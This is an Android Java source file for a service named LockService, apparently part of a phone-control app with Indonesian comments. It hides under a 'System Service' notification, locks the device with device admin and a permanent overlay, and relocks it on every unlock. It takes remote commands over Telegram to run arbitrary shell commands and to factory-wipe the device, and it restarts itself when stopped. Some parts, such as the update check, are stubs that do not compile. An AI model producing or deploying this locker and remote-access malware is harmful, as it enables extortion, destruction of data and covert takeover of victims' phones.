package com.hpcontrol;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.view.WindowManager;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;

public class LockService extends Service {
    
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private PowerManager.WakeLock wakeLock;
    private WindowManager windowManager;
    private LockOverlayView overlayView;
    private TelegramClient telegramClient;
    private String deviceId;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        // Wake lock untuk tetap aktif
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "LockService");
        wakeLock.acquire(10*60*1000L); // 10 menit
        
        // Start foreground service
        startForeground();
        
        // Init Telegram client
        deviceId = getSharedPreferences("hpcontrol", MODE_PRIVATE).getString("device_id", null);
        telegramClient = new TelegramClient(this, deviceId);
        telegramClient.startCommandListener();
        
        // Lock screen immediately
        lockScreen();
        
        // Broadcast receiver untuk screen off/on
        registerReceiver(screenReceiver, new IntentFilter(Intent.ACTION_SCREEN_OFF));
        registerReceiver(screenReceiver, new IntentFilter(Intent.ACTION_SCREEN_ON));
        registerReceiver(screenReceiver, new IntentFilter(Intent.ACTION_USER_PRESENT));
    }
    
    private void startForeground() {
        String channelId = "lock_service";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId,
                "Lock Service Channel",
                NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        
        Notification notification = new NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .build();
        
        startForeground(1, notification);
    }
    
    private void lockScreen() {
        // Method 1: Device Admin Lock
        if (dpm.isAdminActive(adminComponent)) {
            dpm.lockNow();
        }
        
        // Method 2: Overlay layar kunci (permanent)
        showLockOverlay();
    }
    
    private void showLockOverlay() {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        overlayView = new LockOverlayView(this);
        
        int layoutFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                         WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                         WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutFlags |= WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED;
        }
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                WindowManager.LayoutParams.TYPE_PHONE,
            layoutFlags,
            android.graphics.PixelFormat.TRANSLUCENT
        );
        
        windowManager.addView(overlayView, params);
    }
    
    private void executeCommand(String command) {
        if (command.equals("LOCK")) {
            lockScreen();
        } else if (command.equals("UNLOCK")) {
            // Hanya unlock jika perintah dari admin
            if (overlayView != null) {
                windowManager.removeView(overlayView);
                overlayView = null;
            }
        } else if (command.startsWith("SHELL:")) {
            String cmd = command.substring(6);
            executeShellCommand(cmd);
        } else if (command.equals("WIPE")) {
            // Factory reset via device admin
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(0);
            }
        }
    }
    
    private void executeShellCommand(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            // Handle result...
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void checkForUpdates() {
    new Thread(() -> {
        try {
            URL url = new URL(BASE_URL + "/check_update?version=1.0");
            // Download & install update APK
        } catch (Exception e) {}
    }).start();
}

    private final BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF) ||
                intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                lockScreen();
            }
        }
    };
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(screenReceiver);
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        // Restart service jika dimatikan
        Intent restartIntent = new Intent(this, LockService.class);
        startForegroundService(restartIntent);
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}